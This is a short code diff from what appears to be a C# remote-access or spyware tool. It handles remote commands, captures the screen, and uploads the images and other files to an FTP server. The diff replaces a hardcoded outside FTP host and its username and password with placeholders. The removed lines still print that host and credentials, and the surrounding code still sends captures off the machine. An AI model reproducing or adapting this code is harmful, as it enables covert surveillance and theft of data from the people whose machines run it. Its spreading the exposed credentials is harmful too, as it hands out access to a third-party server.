@@ -105,7 +105,7 @@ namespace k3rn3lpanicTools
             {
                 Tools.Capture("capt.jpg");
                 await SendFile("capt.jpg","capt.jpg");
-                new FTPClient("ftp://3287871599.cloudylink.com", "frdiuh", "T63NyMC9Zmkh7w", true).DoWork("capt.jpg");
+                new FTPClient("ftp://", "user", "password", true).DoWork("capt.jpg");
                 sendStr("File Sent.");
             }
             if (recivedtext.StartsWith("VoiceMic"))
@@ -231,7 +231,7 @@ namespace k3rn3lpanicTools
         }
         public static async Task SendFile(string filename,string filenametosave)
         {
-            new FTPClient("ftp://3287871599.cloudylink.com", "frdiuh", "T63NyMC9Zmkh7w", true).DoWork(filename);
+            new FTPClient("ftp://", "username", "Password", true).DoWork(filename);
             await sendStr("FileReqsent-" + filenametosave);
         }
     }
